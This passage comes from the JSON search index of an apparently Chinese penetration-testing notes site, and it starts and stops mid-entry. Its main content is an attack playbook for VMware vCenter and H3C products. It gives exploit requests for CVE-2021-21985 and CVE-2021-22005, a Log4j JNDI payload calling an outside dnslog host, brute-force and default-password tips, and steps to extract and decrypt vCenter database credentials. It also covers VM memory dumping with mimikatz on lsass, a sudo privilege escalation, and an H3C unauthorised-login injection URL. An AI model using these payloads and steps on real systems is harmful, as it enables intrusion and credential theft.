\u4e5f\u53ef\u4ee5get\u8bf7\u6c42 https://ip:port/sdk/vimServiceVersions.xml","title":"\u67e5\u770b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_4","text":"POST /ui/certificate-ui/ctrl/vecs/login HTTP/1.1 Host: xx Content-Type: application/json Content-Length: 86 {\"server\":\"localhost\",\"userName\":\"administrator@qiqing.local\",\"password\":\"1qaz!QAZ..\"} \u6ce8\uff1a\u4f7f\u2f64BurpSuite\u7206\u7834\u65f6\uff0c\u56e0\u4e3a\u5bc6\u7801\u6709\u65f6\u4f1a\u6709\u7279\u6b8a\u5b57\u7b26 \uff0c\u4f8b\u5982` ./=<>?+& *;:\"{}|^``\uff0c\u5c06\u4f1a\u88ab URL\u7f16\u7801\u3002\u7206\u7834\u5bc6\u7801\u65f6\u53bb\u6389\u6b64\u9009\u9879: \u8fd4\u56de\u767b\u5f55\u5931\u8d25\u7684\u54cd\u5e94\u5305","title":"\u5bc6\u7801\u7206\u7834\u63a5\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#rce","text":"\u7efc\u5408\u5229\u7528\u5de5\u5177 https://github.com/Schira4396/VcenterKiller (\u6ca1\u6709\u68c0\u6d4b\u529f\u80fd)","title":"rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cve-2021-21972","text":"vCenter Server7.0 < 7.0.U1c vCenter Server6.7 < 6.7.U3l vCenter Server6.5 < 6.5.U3n /ui/vropspluginui/rest/services/uploadova \u8bbf\u95ee\u4e0a\u9762\u7684\u8def\u5f84\uff0c\u5982\u679c404\uff0c\u5219\u4ee3\u8868\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5982\u679c405 \u5219\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e exp: https://github.com/NS-Sp4ce/CVE-2021-21972 python3 ./CVE-2021-21972.py -url 10.23.2.10","title":"CVE-2021-21972"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cve-2021-21985","text":"poc\uff1a\u8fd4\u56de200\u8bf4\u660e\u80fd\u641e # curl -s -k -X $'POST' -H $'Host: <target>' -H $'User-Agent: a' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\\\"methodInput\\\":[{\\\"type\\\":\\\"ClusterComputeResource\\\",\\\"value\\\": null,\\\"serverGuid\\\": null}]}\\x0d\\x0a' $'https://<target>/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData' exp\uff1a https://github.com/xnianq/cve-2021-21985_exp \u6216\u8005vcenterkiller","title":"CVE-2021-21985&#x20;"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cve-2021-22005","text":"vCenter Server 7.0 < 7.0 U2c build-18356314 vCenter Server 6.7 < 6.7 U3o build-18485166 Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3) Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2) 6.7 vCenters Windows\u7248\u672c\u4e0d\u53d7\u5f71\u54cd exp: https://github.com/shmilylty/cve-2021-22005-exp","title":"CVE-2021-22005"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cve-2021-44228-log4jvcenter","text":"GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1 Host: 192.168.121.137 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Dnt: 1 X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn} Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers Connection: close xxf\u5934dnslog\u6709\u56de\u663e\u5c31\u6709\u8bf4\u6cd5 \u7136\u540e\u4f7f\u7528jndiexploit\u642d\u5efa\u6076\u610fjndi\u670d\u52a1\u5668\u8fdb\u884c\u653b\u51fb\u3002 https://github.com/WhiteHSBG/JNDIExploit","title":"CVE-2021-44228 log4j\u5bf9vcenter\u7684\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#rceweb","text":"","title":"rce\u540e\u83b7\u53d6web\u63a7\u5236\u53f0\u6743\u9650"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_5","text":"\u4f7f\u7528vcenter\u7684admin\u5de5\u5177 #Linux /usr/lib/vmware-vmdir/bin/vdcadmintool #Windows C:\\Program Files\\Vmware\\vCenter Server\\vmdird\\vdcadmintool.exe","title":"\u91cd\u7f6e\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cookie","text":"\u901a\u8fc7\u89e3\u5bc6\u6570\u636e\u5e93\u767b\u5f55\u83b7\u53d6cookie\uff0c\u518d\u7528cookie\u767b\u5f55web \u6570\u636e\u5e93\u4f4d\u7f6e linux\uff1a/storage/db/vmware-vmdir/data.mdb windows\uff1aC:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb 1\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u5de5\u5177 https://github.com/horizon3ai/vcenter_saml_login \u83b7\u5f97cookie python vcenter_saml_login.py -p data.mdb -t 10.9.16.11 \u6ce8 windows\u8fd0\u884c\u811a\u672c\u9700\u8981\u5b89\u88c5\u5bf9\u5e94\u7248\u672c\u7684python-ldap\uff0cwindows\u7684data.mdb\u4e00\u822c\u5f88\u5927\u62c9\u56de\u6765\u4e0d\u65b9\u4fbf\uff08\u51e0\u767e\u5146\u5230\u51e0\u4e2aG\uff09 https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap1 pip install python_ldap-3.4.0-cp38-cp38-win_amd64.whl pip install -r requirements.txt 2\u3002\u5982\u679c\u76ee\u6807\u73af\u5883\u6709python\uff0c\u90a3\u5c31\u4e0d\u7528\u62c9\u56de\u6765\u89e3\u5bc6\u4e86\uff0c\u7528\u8fd9\u4e2a\u811a\u672c https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py \u8fd0\u884c\u540e\u751f\u6210\u4e09\u4e2a\u8bc1\u4e66 \u628a\u4e09\u4e2a\u8bc1\u4e66\u62d6\u56de\u6765\uff08\u53ea\u6709\u51e0k\uff0c\u4e00\u4e0b\u5c31\u62d6\u56de\u6765\u4e86\uff09\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u811a\u672c\u83b7\u53d6cookie https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py \u8fd9\u4e2a\u811a\u672c\u7684\u53c2\u6570\u5217\u8868 <target> <hostname> <domain> <idp_cert path> <trusted_cert_1 path> <trusted_cert_2 path> \u5176\u4e2ddomain\u53ef\u4ee5\u901a\u8fc7vCenter_ExtraCertFromMdb.py\u811a\u672c\u83b7\u5f97 hostname\u662f\u4e3b\u673a\u540d","title":"cookie\u767b\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_6","text":"1\u3002\u83b7\u53d6\u89e3\u5bc6key #Windows type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\ssl\\symkey.dat #Linux cat /etc/vmware-vpx/ssl/symkey.dat \u628akey\u4fdd\u5b58\u4e0b\u6765 2\u3002\u83b7\u53d6\u6570\u636e\u5e93\u8d26\u6237\u5bc6\u7801 vcenter\u9ed8\u8ba4\u6570\u636e\u5e93\u6587\u4ef6\u5b58\u653e\u5728vcdb.properties\uff0c\u914d\u7f6e\u6587\u4ef6\u4e2d\u6709\u6570\u636e\u5e93\u7684\u660e\u6587\u8d26\u53f7\u5bc6\u7801 #Linux cat /etc/vmware-vpx/vcdb.properties cat /etc/vmware/service-state/vpxd/vcdb.properties #Windows type C:\\ProgramData\\VMware\\\"VMware VirtualCenter\"\\vcdb.properties type C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties 3\u3002\u767b\u5f55\u6570\u636e\u5e93 \u9ed8\u8ba4\u662fpostgresql #psql\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e Windows: C:\\Program Files\\VMware\\vCenter Server\\vPostgres\\bin\\psql.exe Linux: /opt/vmware/vpostgres/9.3/bin/psql #\u6267\u884c\u8bed\u53e5\u67e5\u8be2 psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" &gt; password.enc #\u6267\u884c\u5b8c\u4f1a\u8f93\u51fa\u4e00\u6bb5\u52a0\u5bc6\u5b57\u6bb5 Command&gt; shell psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c \"select ip_address,user_name,password from vpx_host;\" &gt; password.enc Shell access is granted to root Password for user vc: ip_address | user_name | password -------------+-----------+--------------------------------------------------------------------------------------- 192.168.1.1 | vpxuser | *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg== 192.168.1.2 | vpxuser | *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q== 192.168.1.3 | vpxuser | *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw== 192.168.1.4 | vpxuser | *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA== (4 rows) #\u53ea\u4fdd\u7559password\u5b57\u6bb5 *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg== *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q== *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw== *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA== \u5982\u679c\u662fmssql\uff0c\u8fd9\u65f6\u5019\u76f4\u63a5\u4f7f\u7528 navicat \u8fdb\u884c\u8fde\u63a5\uff0c\u641c\u7d22 VPX_HOST \u8868 \u5176\u5b83\u6570\u636e\u5e93\u5c31\u7528navicat\u8fde\u6162\u6162\u627e\u5427\uff0c\u5b9e\u6218\u9047\u5230\u518d\u6765\u8865\u5145\u3002 \u53ea\u628apassword\u4fdd\u7559\u4e0b\u6765\u5373\u53ef 4\u3002\u89e3\u5bc6\u5bc6\u7801 https://github.com/shmilylty/vhost_password_decrypt \u7136\u540e\u62ff\u53bb\u767b\u5f55\u5373\u53ef","title":"\u6570\u636e\u5e93\u76f4\u63a5\u89e3\u5bc6\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#web","text":"","title":"\u83b7\u53d6web\u63a7\u5236\u53f0\u540e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_7","text":"","title":"\u83b7\u53d6\u865a\u62df\u673a\u6743\u9650"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#dump-windows","text":"https://github.com/RicterZ/PySharpSphere \u4f7f\u7528\u8be5\u5de5\u5177\u5373\u53ef\u76f4\u63a5\u64cd\u63a7vcenter\u4e2d\u7684\u865a\u62df\u673a\uff0c\u5f88\u65b9\u4fbf\u3002 $ pysharpsphere -H 192.168.3.249 -u opsadmin@vsphere.local -p 123QWEasd@ execute -t vm-13 --guest-user administrator --guest-ntlm ccf9155e3e7db453aad3b435b51404ee -c whoami pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password execute -t vm-1020 --guest-user administrator --guest-pass guestpassword -c whoami \u4f46\u662f\u6ca1\u6709\u865a\u62df\u673a\u7684\u5bc6\u7801\u6216\u8005hash\u503c\uff0c\u4e5f\u5c31\u4e0d\u80fd\u5728\u865a\u62df\u673a\u4e2d\u6267\u884c\u547d\u4ee4\u3002 \u8981\u83b7\u53d6\u865a\u62df\u673a\u5bc6\u7801\u6216\u8005hash\u6211\u4eec\u53ef\u4ee5\u628a\u865a\u62df\u673adump\u51fa\u6765 pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password dump -t vm-1020 \u7136\u540e\u4f7f\u7528volatility\u6293\u53bb\u5bc6\u7801\u6216\u8005hash https://www.volatilityfoundation.org/26 #\u83b7\u53d6\u955c\u50cf\u4fe1\u606f\uff1a ./vol -f win2k03-Snapshot1.vmem imageinfo #\u6293hash ./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 hashdump #\u6293\u53d6\u660e\u6587\u5bc6\u7801-\u5982\u679c\u6709 ./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 lsadump","title":"\u8fdc\u7a0bdump - windows"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#dump-windows_1","text":"#1\u3001\u5728web\u9875\u9762\u53f3\u952e\u865a\u62df\u673a\u751f\u6210\u865a\u62df\u673a\u5feb\u7167\uff0c\u7136\u540e\u5728\u6570\u636e\u5b58\u50a8\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u865a\u62df\u673a\u540d\u5b57\u7684\u6587\u4ef6\u5939\u4e0b\u4f1a\u751f\u6210\u4e24\u4e2avmem vmsn\u6587\u4ef6 #\uff1f \u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u4e0a\u4e00\u6b65\u7684volatity\u76f4\u63a5dump hash #2\u3001\u7528vss2core \u6574\u5408\u4e24\u4e2a\u6587\u4ef6\uff0c\u51fa\u73b0dump\u6587\u4ef6\uff0c\u628adump\u6587\u4ef6\u62c9\u56de\u6765\u672c\u5730 https://flings.vmware.com/vmss2core vss2core -W 1.vmem 1.vmsn PS\uff1a\u5982\u679c\u76ee\u6807\u662f2012,2016,2019,Windows 8/8.1 \u8bf7\u628a-W \u6539\u6210-W8 #3\u3001\u7136\u540e\u7528windbg preview\u6253\u5f00\uff0c\u6ce8\u610f\u4e00\u5b9a\u8981\u6700\u65b0\u7248win10\u7684\uff0c\u968f\u4fbf\u4e0b\u4e00\u4e2a\u65e7\u7248\u7684\u4e0d\u884c #4\u3001\u5728windbg\u4e0a\u8f7d\u5165mimikatz .load D:\\tmpdump\\mimilib.dll #5\u3001\u5bfc\u51falsass.exe\u7684\u5185\u5b58\u3001\u8fd9\u91cc\u4f1a\u8fd4\u56de\u4e00\u4e2aprocess\u5730\u5740 !process 0 0 lsass.exe #6\u3001\u5230\u5bf9\u5e94\u5185\u5b58\u4f4d\u7f6e\u6267\u884cmimikatz\uff0c\u7136\u540e\u5c31\u4f1a\u51fa\u5bc6\u7801\u4e86 .process /r /p ffffa68274d8a080 !mimikatz","title":"\u5feb\u7167dump - windows"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#linux","text":"\u672c\u8d28\u4e0a\u5c31\u662flinux\u5fd8\u8bb0\u5bc6\u7801\u4e86\u600e\u4e48\u529e\uff0c\u6211\u770b\u7f51\u4e0a\u6709\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u641e\u3002\u8fd9\u91cc\u53ea\u8bf4\u4e00\u4e2acentos\u7684\uff0cubuntu\u5565\u7684\u4e5f\u662f\u5927\u540c\u5c0f\u5f02\uff1a https://zhuanlan.zhihu.com/p/145417594 \uff08ubuntu\u5fd8\u8bb0\u5bc6\u7801\u600e\u4e48\u529e\uff09 \u9700\u91cd\u542f\uff0c\u4f46\u53ef\u4ee5\u590d\u5236\u4e00\u4e2a\u518d\u91cd\u542f\uff0c\u4ee5\u514d\u751f\u4ea7\u73af\u5883g\u4e86\u3002 \u5728\u5f00\u673a\u754c\u9762\u6309\u5b57\u6bcde\u8fdb\u5165\u5f15\u5bfc \u5728linux16\u8fd9\u4e00\u884c\u627e\u5230\u201cro\u201d \uff0c\u5c06 \u201cro\u201d \u4fee\u6539\u4e3a \u201d rw init=/sysroot/bin/bash \u201c\uff1b \u7136\u540e\u6309\u4e0bctrl+x\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f\uff0c\u8f93\u5165\u5982\u4e0b\u547d\u4ee4 chroot /sysroot passwd root //\u91cd\u7f6e\u5bc6\u7801 touch /.autorelabel exit reboot -f \u91cd\u542f\u540e\u5c31\u80fd\u62ff\u5bc6\u7801\u767b\u5f55\u4e86","title":"linux\u76f4\u63a5\u4fee\u6539\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#_8","text":"","title":"\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%99%9A%E6%8B%9F%E5%8C%96%E8%AE%BE%E5%A4%87%EF%BC%88%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89/vmware%20vcenter/vmware%20vcenter/#cve-2021-3156","text":"\u9002\u7528\u7248\u672c\uff1avCenter 7.0 sudo \u63d0\u6743\u6f0f\u6d1e\u5c06 vsphere-ui \u6743\u9650\u63d0\u5347\u5230 root \u6743\u9650\u3002 https://github.com/worawit/CVE-2021-3156/tree/main Choosing exploit For Linux distributions that glibc has tcache support and enabled (CentOS 8, Ubuntu >= 17.10, Debian 10): try exploit_nss.py first If an error is not glibc tcache related, you can try exploit_timestamp_race.c next For Linux distribution that glibc has no tcache support: if a target is Debian 9, Ubuntu 16.04, or Ubuntu 14.04, try exploit_nss_xxx.py for specific version first next, try exploit_defaults_mailer.py. If you know a target sudo is compiled with --disable-root-mailer, you can skip this exploit. The exploit attempt to check root mailer flag from sudo binary. But sudo permission on some Linux distribution is 4711 (-rws--x--x) which is impossible to check on target system. (Known work OS is CentOS 6 and 7) last, try exploit_userspec.py","title":"CVE-2021-3156"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/","text":"\u8fd0\u7ef4\u7c7b&\u5f00\u53d1&\u8bbe\u5907 Zabbix Habor cpanel \u601d\u79d1\u7cfb \u6c49\u5f97srm \u6d77\u5eb7\u5a01\u89c6 jumpserver\u5821\u5792\u673a gitlab RabbitMQ druid H3C jenkins \u5947\u5b89\u4fe1&360 \u7eff\u76df \u8fb0\u4fe1\u666f\u4e91 \u5b89\u6052 FortiClient \u542f\u660e\u661f\u8fb0 Teleport \u4e2d\u8fdc\u9e92\u9e9f \u9f50\u6cbb \u601d\u798f\u8fea 1panel \u5b9d\u5854 \u6df1\u4fe1\u670d \u9510\u6377 nacos nginx webui zookeeper svn X11","title":"\u8fd0\u7ef4\u7c7b&\u5f00\u53d1&\u8bbe\u5907"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/#_1","text":"Zabbix Habor cpanel \u601d\u79d1\u7cfb \u6c49\u5f97srm \u6d77\u5eb7\u5a01\u89c6 jumpserver\u5821\u5792\u673a gitlab RabbitMQ druid H3C jenkins \u5947\u5b89\u4fe1&360 \u7eff\u76df \u8fb0\u4fe1\u666f\u4e91 \u5b89\u6052 FortiClient \u542f\u660e\u661f\u8fb0 Teleport \u4e2d\u8fdc\u9e92\u9e9f \u9f50\u6cbb \u601d\u798f\u8fea 1panel \u5b9d\u5854 \u6df1\u4fe1\u670d \u9510\u6377 nacos nginx webui zookeeper svn X11","title":"\u8fd0\u7ef4\u7c7b&amp;\u5f00\u53d1&amp;\u8bbe\u5907"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/1panel/1panel/","text":"1panel","title":"1panel"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/1panel/1panel/#1panel","text":"","title":"1panel"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/FortiClient/FortiClient/","text":"FortiClient \u7efc\u5408\u5b89\u5168\u8f6f\u4ef6\uff0c\u7528\u4e8e\u4fdd\u62a4\u4e2a\u4eba\u8ba1\u7b97\u673a\u548c\u79fb\u52a8\u8bbe\u5907\u514d\u53d7\u5404\u79cd\u7f51\u7edc\u5a01\u80c1\u7684\u5f71\u54cd\u3002\u5b83\u63d0\u4f9b\u4e86\u9632\u75c5\u6bd2\u3001\u9632\u706b\u5899\u3001\u865a\u62df\u4e13\u7528\u7f51\u7edc\uff08VPN\uff09\u4ee5\u53ca\u5176\u4ed6\u5b89\u5168\u529f\u80fd","title":"FortiClient"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/FortiClient/FortiClient/#forticlient","text":"\u7efc\u5408\u5b89\u5168\u8f6f\u4ef6\uff0c\u7528\u4e8e\u4fdd\u62a4\u4e2a\u4eba\u8ba1\u7b97\u673a\u548c\u79fb\u52a8\u8bbe\u5907\u514d\u53d7\u5404\u79cd\u7f51\u7edc\u5a01\u80c1\u7684\u5f71\u54cd\u3002\u5b83\u63d0\u4f9b\u4e86\u9632\u75c5\u6bd2\u3001\u9632\u706b\u5899\u3001\u865a\u62df\u4e13\u7528\u7f51\u7edc\uff08VPN\uff09\u4ee5\u53ca\u5176\u4ed6\u5b89\u5168\u529f\u80fd","title":"FortiClient"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/H3C/H3C/","text":"H3C \u76ee\u5f55 secpath\u5821\u5792\u673a \u672a\u6388\u6743\u7528\u6237\u767b\u5f55 IMC \u667a\u80fd\u7ba1\u7406\u4e2d\u5fc3 \u9ed8\u8ba4\u5bc6\u7801 rce secpath\u5821\u5792\u673a app=\"H3C-SecPath-\u8fd0\u7ef4\u5ba1\u8ba1\u7cfb\u7edf\" && body=\"2018\" \u672a\u6388\u6743\u7528\u6237\u767b\u5f55 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin IMC \u667a\u80fd\u7ba1\u7406\u4e2d\u5fc3 \u9ed8\u8ba4\u5bc6\u7801 \u524d\u53f0\u5bc6\u7801\uff1a iMC PLAT 7.3 (E0706)\u4e4b\u524d\u7248\u672c\u9ed8\u8ba4\u5bc6\u7801\u662fadmin iMC PLAT 7.3 (E0706)\u53ca\u540e\u7eed\u7248\u672c\u9ed8\u8ba4\u5bc6\u7801\u662f Pwd@12345 \u540e\u53f0\u5bc6\u7801\uff1a windows\u5bc6\u7801\u4e3a\u8fdb\u5165\u64cd\u4f5c\u7cfb\u7edf\u7684\u5bc6\u7801 linux\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684root\u5bc6\u7801\uff0c\u5982\u679c\u662f\u4e00\u952e\u90e8\u7f72\u7248\u672c\uff0c\u5219root\u5bc6\u7801\u9ed8\u8ba4\u4e3aiMC123 rce POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: <IP:PORT> Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=h6t3jznn9; JSESSIONID=28B00884107242919B20BD70146EDFCB; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1567 